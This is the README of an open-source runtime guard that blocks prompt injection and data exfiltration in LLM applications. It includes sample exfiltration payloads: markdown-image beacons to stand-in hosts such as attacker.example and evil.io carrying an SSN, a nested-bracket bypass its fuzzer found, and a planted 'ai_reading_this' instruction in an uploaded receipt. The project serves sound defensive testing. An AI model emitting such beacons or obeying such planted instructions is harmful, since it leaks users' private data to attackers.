# Axiom

[![CI](https://github.com/zoniin/axiom/actions/workflows/ci.yml/badge.svg)](https://github.com/zoniin/axiom/actions/workflows/ci.yml)
![license](https://img.shields.io/badge/license-MIT-blue)
![node](https://img.shields.io/badge/node-%E2%89%A520-brightgreen)

**A deterministic runtime security layer for LLM applications.** Axiom sits between your app and the model and enforces information-flow rules: what context the model may see, what its output may render, and where data may go. It does not try to guess whether a prompt is malicious.

**[Try it in your browser →](https://zoniin.github.io/axiom/)** The playground runs the real engine client-side against all 72 red-team scenarios. You can edit any request or policy and watch a stream get halted before a beacon renders.

[![Axiom playground: a web page's hidden instruction to embed a tracking image is detected, the image is blocked, and the safe output is shown](docs/playground.png)](https://zoniin.github.io/axiom/)

```text
$ axiom check examples/request.json --policy examples/policy.yaml
decision: BLOCK  (14 rules evaluated)
  AX-CTX-003  escalate  context:upload-3  Untrusted upload:receipt.pdf contains instructions (ai_reading_this).  [assistant reading this]
  AX-OUT-001  block     output            Output contains 1 auto-fetching/active element(s): markdown_image.  [![](https://collect.example/r?…)]
  AX-OUT-002  sanitize  output            Defanged 1 link(s) to unapproved host(s): collect.example.
  AX-ACT-001  block     action:1          Host collect.example is not an approved HTTP destination.
  AX-ACT-002  escalate  action:0          tool action while context is tainted by [upload-3].
  AX-ACT-002  escalate  action:1          http action while context is tainted by [upload-3].
  AX-ACT-003  block     action:1          Destination "collect.example" was supplied by untrusted chunk upload-3.
  AX-DLP-002  block     action:1          http action carries sensitive data: ssn.  [ssn(…89)]

sanitized output:
  Your refund will arrive within 5 business days. [image removed]
```

## Why

You can't patch prompt injection with a better classifier. A model reading attacker-controlled text (an uploaded PDF, a web page, an email, a tool result) can be steered, and a detector that's right 99% of the time still fails often enough to matter. A slightly reworded attack gets past it.

Axiom treats injection as a data-flow problem instead:

- **Retrieval is authorized before the model sees it.** Cross-tenant chunks fail closed. Chunks above the user's role or clearance are dropped.
- **Untrusted content is tainted.** It's wrapped in provenance delimiters, and while it's in context, every side effect needs approval. Memory writes are refused outright, and a destination that came from the untrusted text is blocked.
- **Outbound sinks are default-deny.** HTTP, email, tools, memory and export each need an explicit policy entry. URLs must be HTTPS, with no IP literals, embedded credentials or internal hostnames.
- **Output can't phone home.** Markdown images, raw HTML, event handlers, CSS `url()` and `javascript:`/`data:` URIs are blocked or stripped. These are the zero-click channels used in real exfiltration bugs. Links to unknown hosts are defanged.
- **Secrets don't leave.** Structurally validated DLP (Luhn, SSA ranges, IBAN mod-97, cloud keys, tokens) runs on output and on every action argument, including percent-encoded and base64-encoded URL parts.
- **Every decision is audited.** Audit events are hash-chained, record the policy hash, and never contain raw prompt text or secrets.

Heuristic injection detection is included, but only as a signal. When it misses (and the [known-gap scenarios](harness/scenarios/09-known-gaps.yaml) show where it does), the taint and sink rules still contain the attack.

## Install

```bash
npm install
npm run build
```

Requires Node 20+. Runtime dependencies: `zod`, `yaml`, `hono`.

## Use it as a library

Call Axiom twice per turn: once before the model (to authorize and label context) and once after (to check output and proposed actions).

```ts
import { Axiom } from 'axiom-guard';

const axiom = new Axiom({
  policy: {
    sinks: {
      http: { allow: [{ host: 'hooks.example.com', methods: ['POST'], pathPrefix: '/v1/' }] },
      tools: { allow: ['search_kb'], escalate: ['issue_refund'] },
    },
    rendering: { linkAllowHosts: ['*.example.com'] },
    canaries: ['AXIOM-CANARY-3f9a1c'], // plant this in your system prompt
  },
});

// 1. Before the model
const pre = axiom.evaluate({ tenantId, principal, input, context: retrievedChunks });
if (pre.decision === 'block') return refuse();
const prompt = buildPrompt(input, pre.context.authorized.map((c) => c.rendered));

// 2. After the model, before rendering or executing anything
const { text, toolCalls } = await callModel(prompt);
const post = axiom.evaluate({ tenantId, principal, input, context: pre.context.authorized, output: text, actions: toolCalls });

switch (post.decision) {
  case 'allow':
  case 'sanitize': return render(post.output!.sanitized, post.actions.filter((a) => a.decision === 'allow'));
  case 'escalate': return queueForReview(post);
  case 'block':    return refuse();
}
```

A complete runnable version is in [`examples/rag-pipeline.ts`](examples/rag-pipeline.ts) (`npm run example`).

## Streaming

Most apps stream tokens to the user, and an image beacon only has to *render* once to leak. So checking the finished response is too late. `StreamGuard` releases text only once it can no longer change meaning: it holds back the trailing word, anything after an unclosed `[`, `(`, `<` or `![`, and digit runs that could still become a card number. Each released prefix goes through the full engine. If an output rule would escalate or block, the stream halts before the offending text is shown.

```ts
for await (const text of guardStream(axiom, { tenantId, principal, input, context }, modelTokens)) {
  res.write(text); // only checked text reaches the client
}
```

```text
token               released     notes
"Summary"           ""           trailing word may still grow
" done."            "Summary "
" !["               "done. "     "![" is held back
"x](https://evil"   ""
".io/c?d=123-45"    ""
"-6789)"            ""
" thanks"           ■ halted     AX-OUT-001: the image is complete, and none of it was shown
```

A property-based test checks that for every harness output and any way of chunking it, the streamed text is identical to the non-streamed sanitized output, or the stream halted.

## Use it as a gateway

```bash
npx axiom serve --policy policies/fintech-support.yaml --audit audit.jsonl
```

```bash
curl -s localhost:8787/v1/evaluate -H 'content-type: application/json' -d '{
  "tenantId": "acme",
  "output": "Done! ![](https://attacker.example/c?d=123-45-6789)"
}' | jq '{decision, sanitized: .output.sanitized}'
```

```json
{ "decision": "block", "sanitized": "Done! [image removed]" }
```

| Endpoint | |
|---|---|
| `POST /v1/evaluate` | Evaluate a request (Zod-validated, 2 MB limit) |
| `GET /v1/rules` | Rules with effective actions and lock status |
| `GET /v1/policy` | Effective policy and its hash |
| `GET /health` | Liveness and policy hash |

Other CLI commands: `axiom check <request.json>`, `axiom harness`, `axiom audit verify <audit.jsonl>`, `axiom rules`.

## Rules

| ID | Default | Locked | What it does |
|---|---|---|---|
| `AX-CTX-001` | block | yes | Drops cross-tenant chunks and fails the request closed |
| `AX-CTX-002` | sanitize | yes | Drops chunks the principal's roles or clearance don't allow |
| `AX-INP-001` | escalate | | Instruction-override and jailbreak phrasing in user input |
| `AX-INP-002` | sanitize | | Strips zero-width and bidi characters; escalates Unicode tag-character smuggling |
| `AX-CTX-003` | escalate | | Instructions addressed to the model inside untrusted content |
| `AX-OUT-001` | block | | Auto-fetching or executable output: images, active HTML, dangerous URIs |
| `AX-OUT-002` | sanitize | | Defangs links to hosts outside `rendering.linkAllowHosts` |
| `AX-OUT-003` | block | yes | System-prompt canary appears in output or actions |
| `AX-DLP-001` | sanitize | | Redacts validated secrets and identifiers in output |
| `AX-OUT-004` | escalate | | Binding-sounding commitments (finance, legal, healthcare packs) |
| `AX-ACT-001` | block | yes | Default-deny sink policy for http, email, tool, memory, export |
| `AX-ACT-002` | escalate | yes | Any action while context is tainted; memory writes block |
| `AX-ACT-003` | block | yes | Action destination was supplied by untrusted content |
| `AX-DLP-002` | block | yes | Sensitive data in action target or payload, including encoded forms |

Decisions form a lattice, `allow < sanitize < escalate < block`, and a request takes the most restrictive finding. Policy `overrides` can retune any rule, but **locked rules can only be made stricter**: a policy that tries to weaken one is rejected at startup. A rule that throws produces a `block` (`AX-SYS-001`). You can add your own rules with `new Axiom({ rules: [...] })`.

## Red-team harness

[`harness/scenarios/`](harness/scenarios) has 72 scenarios across direct and indirect injection, rendering exfiltration, sink exfiltration, retrieval authorization, Unicode obfuscation, data leakage and unsupported commitments. Each attack is paired with benign look-alikes, because a guard that blocks everything is useless. CI runs the harness on every push and regenerates [`harness/REPORT.md`](harness/REPORT.md).

| Metric | Result |
|---|---|
| Attack scenarios contained | 50 / 50 |
| Benign scenarios passed through | 19 / 19 |
| Benign false positives | 0 |
| Documented known gaps | 3 |

These numbers come from a hand-written corpus checked against deterministic rules, so read them as a regression suite, not a benchmark claim. The known-gap scenarios are kept on purpose: paraphrased injections, non-English injections, and free-text personal data sent to an approved host all get through. See [docs/threat-model.md](docs/threat-model.md) for what Axiom does and doesn't defend against.

## Fuzzing

Hand-written scenarios only cover attacks someone thought of. [`test/properties.test.ts`](test/properties.test.ts) uses [fast-check](https://fast-check.dev) to generate thousands of adversarial outputs from exfiltration-relevant fragments (brackets, tags, schemes, invisible characters, secrets) and checks the invariants in [SECURITY.md](SECURITY.md) on every run:

- sanitized output never contains auto-fetching or executable content
- redaction is complete: nothing a DLP detector flags survives sanitization
- sanitization is idempotent
- a cross-tenant chunk always blocks and never reaches the model
- tainted context never allows an action
- audit events never contain sensitive values
- evaluation is deterministic

The fuzzer has already paid for itself. It found that `![[x]](https://evil)` (nested brackets, valid CommonMark) got past image detection, that the sanitizer's own `[removed]` markers could combine with leftover `![` and `(url)` into a new live image, and that secrets glued to letters (`keyAKIA…`) evaded word-boundary DLP. All three are fixed and pinned by regression tests and harness scenarios. Detection is now conservative, and the sanitizer runs to a fixpoint and finishes with a neutralizing pass, so the first invariant holds by construction rather than by regex coverage.

## Performance

Measured with `npm run bench` on Node 22 in a 4-vCPU cloud container (deterministic rules, no detectors, single thread):

| Scenario | p50 | p99 | Throughput (1 core) |
|---|---|---|---|
| Chat turn (input + 300 B output) | 55 µs | 161 µs | 16,075 req/s |
| RAG turn (10 chunks x 1 KB, 1 KB output) | 657 µs | 1.28 ms | 1,349 req/s |
| Agent turn (5 chunks, 3 actions) | 177 µs | 488 µs | 5,160 req/s |
| Adversarial 10 KB output | 1.69 ms | 3.09 ms | 554 req/s |

Native SHA-256 is used for audit digests on Node. A portable implementation keeps the core working in browsers and edge runtimes (`import { Axiom } from 'axiom-guard/core'`).

## Design principles

1. **No classifier is the security boundary.** Model-based detectors plug in through the `Detector` interface, behind a feature flag and a timeout, and can only add findings.
2. **Deterministic.** Same request, same policy, same result. Clock and ID generator are injectable, so tests are exact.
3. **Fail closed.** Rule errors block. Unknown sink kinds block. An empty policy denies every side effect.
4. **Small, explainable rules.** Each rule is a short module with an ID, a default action and a description. There's no opaque risk score.
5. **The audit log isn't a data leak.** Events carry rule IDs, masked evidence and a request digest, never raw content.

## Layout

```text
src/
  engine.ts          two-pass evaluation: authorize context, then run content rules
  policy.ts          Zod policy schema, loader, canonical hash
  schema.ts          Zod request schema for the API boundary
  rules/             one module per concern (retrieval, input, rendering, leakage, sinks, commitments)
  text/              normalization, URL canonicalization, markdown/HTML scanning, DLP detectors
  audit/             hash-chained audit log, JSONL sink, chain verification
  detectors/         optional model-detector adapter with timeout
  stream.ts          StreamGuard for token-by-token output
  core.ts            runtime-agnostic entry (browsers, edge); index.ts adds Node file I/O
  server.ts, cli.ts  HTTP gateway and CLI
playground/          browser playground (deployed to GitHub Pages)
harness/             policy + YAML scenario corpus + generated report
policies/            starter and example policies
schemas/             JSON Schemas generated from the Zod definitions
test/                unit tests for every rule, property-based fuzzing, streaming
```

## Docs

- [Architecture](docs/architecture.md): request lifecycle, trust model, taint
- [Threat model](docs/threat-model.md): threats mapped to controls and scenarios, plus explicit non-goals
- [Roadmap](docs/roadmap.md)
- [Literature](docs/literature.md): research this design draws on

## License

MIT
